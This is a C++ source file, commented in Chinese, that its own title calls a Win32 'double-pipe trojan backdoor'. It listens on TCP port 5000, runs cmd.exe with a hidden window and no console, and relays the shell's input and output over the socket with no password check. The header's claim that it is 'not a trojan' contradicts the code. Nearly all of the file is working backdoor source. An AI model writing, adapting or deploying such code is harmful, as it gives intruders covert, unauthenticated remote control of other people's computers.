//在VC++2008通过
//WIN32SDK之双管道木马后门编写，附源码超详细注释
//在本机CMD 中通过 telnet来连接
/***************************************************************************************************
* 1、 File       ： PipeTrojans.cpp
* 2、 Version    ： *.*
* 3、 Description： 这并不是一个木马，仅仅只是一个远程执行cmd命令的工具
* 4、 Author     ： RG (http://www.9cpp.com/)
* 5、 Created    ： 2013-7-23 13:13:21
* 6、 History    ： 
* 7、 Remark     ： 目前还很不完善，需要添加以下机制
*                   1、socket收发命令解析机制(单个字符合并、命令分析<添加自定义命令(如退出、开启CMD)>、断开重连、密码验证)
*                   2、管道可改用双向命令管道
*                   3、这两个线程还有问题(无限循环)
****************************************************************************************************/
#include <stdio.h>

#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")
#include<stdlib.h>
#pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"")
#include "TraceUtil.h"
//定义套接字句柄
SOCKET sListen, sClient;
//定义管道句柄
//管道1
HANDLE g_hReadPipe;  //读管道句柄
HANDLE g_hWritePipe; 
//管道2
HANDLE g_hWriteFile; //写管道句柄
HANDLE g_hReadFile;

//接受远程主机命令并写入管道2
DWORD WINAPI Thread2(LPVOID lpParam)
{
    SECURITY_ATTRIBUTES sa;
    DWORD nByteToWrite, nByteWritten;         //要写入的字节数//实际写入的字节数
    char recv_buff[1024];                     //定义接收命令的缓冲区
    sa.nLength = sizeof(SECURITY_ATTRIBUTES); //结构体的大小
    sa.lpSecurityDescriptor = NULL;           //安全描述符
    sa.bInheritHandle = TRUE;                 //对象能否被新创建的进程继承

    //创建管道
	if (!CreatePipe(&g_hReadPipe,     //读管道句柄
               &g_hWritePipe,    //写管道句柄
               &sa,              //指向结构sa
               0                 //缓冲区大小
              ))
	{
		::MessageBox(NULL, "创建管道2(CMD写入管道)失败\r\n", "Tiptop", MB_OK);
		return 0;
	}
 

    while(true)//循环
    {
        Sleep(250);//延时250毫秒
		memset(recv_buff, 0, 1024);
        //接受远程CMD命令
        nByteToWrite = recv(sClient,   //套接字句柄
                            recv_buff, //缓冲区
                            1024,      //缓冲区长度
                            0          //调用方式
                           );
		if (-1 == nByteToWrite)
		{
			continue;
		}
		//RG::TRACE("<--接受远程CMD命令数据:%s 长度:%d!!!", recv_buff, nByteToWrite);
		RG::TRACE("<--:%s\r\n", recv_buff);
        //写入管道
        WriteFile(g_hWritePipe,    //写入的句柄
                  recv_buff,       //缓冲区长度
                  nByteToWrite,    //要写入的字节数
                  &nByteWritten,   //实际写入的字节数
                  NULL
                 );
    }
    return 0;
}

//读取管道1的数据  返回主机
DWORD WINAPI Thread1(LPVOID lpParam)
{
    SECURITY_ATTRIBUTES sa;
    DWORD len;                                //缓冲区长度
    char send_buff[2048];                     //定义发送数据的缓冲区
    sa.nLength = sizeof(SECURITY_ATTRIBUTES); //结构体的大小
    sa.lpSecurityDescriptor = NULL;           //安全描述符
    sa.bInheritHandle = TRUE;                 //对象能否被新创建的进程继承

	memset(send_buff, 0, 2048);
    //创建管道
	if (!CreatePipe(&g_hReadFile, &g_hWriteFile, &sa, 0))
	{
		::MessageBox(NULL, "创建管道1(CMD读取管道)失败\r\n", "Tiptop", MB_OK);
		return 0;
	}

    while(true)//死循环
    {
		memset(send_buff, 0, 2048);
        //读取管道中的数据
        ReadFile(g_hReadFile,
                 send_buff,
                 2048,
                 &len,
                 NULL
                );

		//RG::TRACE("-->读取管道1中的数据:%s 长度:%d!!!", send_buff, len);
		RG::TRACE("-->:%s\r\n", send_buff);
        //把管道中的数据发送给远程主机
        send(sClient, send_buff, len, 0);
    }
    return 0;
}


int main()
{
    char wMessage[255] = "---------------欢迎进入CMD-------------\r\n";
    HANDLE  hThread[2];                //定义两个线程
    DWORD dwThreadidA, dwThreadidB;    //定义两个线程ID
    PROCESS_INFORMATION pi;            //定义进程信息结构&pi
    STARTUPINFO si;                    //定义新进程的信息结构&si
    //初始化socket,并绑定本地端口
    BYTE minorVer = 2; //低位
    BYTE majorVer = 2; //高位
    //初始化WSA
    WSADATA wsData;//保存WinSock的版本信息
    WORD SockVersion = MAKEWORD(minorVer, majorVer);
    if(WSAStartup(SockVersion, &wsData) != 0) //失败返回0
        return 0;
    //建立套接字
    sListen = socket(AF_INET,      //地址格式只能为它
                     SOCK_STREAM,  //流套接字，使用TCP连接
                     IPPROTO_TCP   //协议类型  TCP通信
                    );

    //关联本地地址到套接字
    sockaddr_in sin;                              //定义结构
    sin.sin_family = AF_INET;                     //域必须设置为AF_INET
    sin.sin_port = htons(5000);                   //指定TCP通信服务端口
    sin.sin_addr.S_un.S_addr = INADDR_ANY;        //所有可用的地址
    bind(sListen, (LPSOCKADDR)&sin, sizeof(sin)); //绑定

    //调用listen 进入监听状态
    listen(sListen,  //套接字句柄
           2         //最大连接数
          );

    //接受一个连接
    sClient = accept( sListen, //套接字句柄
                      NULL,  //指向sockaddr结构指针，用来存放客户端的地址信息
                      NULL  //指向sockaddr结构长度
                    );

    //创建两个线程  用于读取管道的数据
    hThread[0] = CreateThread(NULL,           //指定新线程安全属性
                              NULL,           //用来分配以字节数表示的线程堆栈大小
                              Thread1,        //线程函数地址
                              NULL,           //传递给线程函数的参数
                              0,              //表示立即执行当前创建的线程
                              &dwThreadidA    //返回新线程的ID
                             );
    hThread[1] = CreateThread(NULL, NULL, Thread2, NULL, 0, &dwThreadidB);
    //暂停1秒  保证两个线程创建完毕
    Sleep(1000);

    GetStartupInfo(&si);
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    //使CMD的输入和管道关联
    si.hStdInput = g_hReadPipe;   //读取
	si.hStdError = g_hWriteFile;
    si.hStdOutput = g_hWriteFile; //写入
    si.wShowWindow = SW_HIDE;   //窗口隐藏
    char cmdline[256] = {0};    //初始化路径
	si.cb = sizeof(STARTUPINFO);

	//得到系统路径
    GetSystemDirectory(cmdline, sizeof(cmdline));
    strcat(cmdline, "\\cmd.exe");

    //创建进程
    if(CreateProcess( cmdline,  //指向包含了可执行文件名   路径
                      NULL,     //指向命令行字符串，用于传递可执行文件参数  NULL
                      NULL ,    //进程的安全属性，NULL
                      NULL ,    //进程初始线程（主线程）的安全属性，NULL，
                      TRUE,     //子进程是否可以继承夫进程句柄TRUE
                      0,        //创建进程的优先级和进程类别0
                      NULL,     //指向环境变量块，环境变量块可以被子进程继承NULL
                      NULL,     //指向表示当前目录的字符串，当前目录可以继承NULL
                      &si,      //指向StartupInfo结构            &si
                      &pi       //指向PROCESS_INFORMATION         &pi
                    ) == 0)
    {
        printf("创建进程失败\n");
		MessageBox(NULL,"Create Process Error!!!", "", MB_OK);
        return 0;
    }

    //发送一个欢迎信息
    send(sClient, wMessage, strlen(wMessage), 0);
	RG::TRACE("发送一个欢迎信息：%s!!!\r\n", wMessage);
    //等待线程结束
    WaitForMultipleObjects(2,          //指定数量的对象句柄指向的数组
                           hThread,    //对象句柄数组的指针
                           true,       //指定等待类型。如果属实，该函数返回的状态时
                           INFINITE    //无限等待结束
                          );

    return 0;

}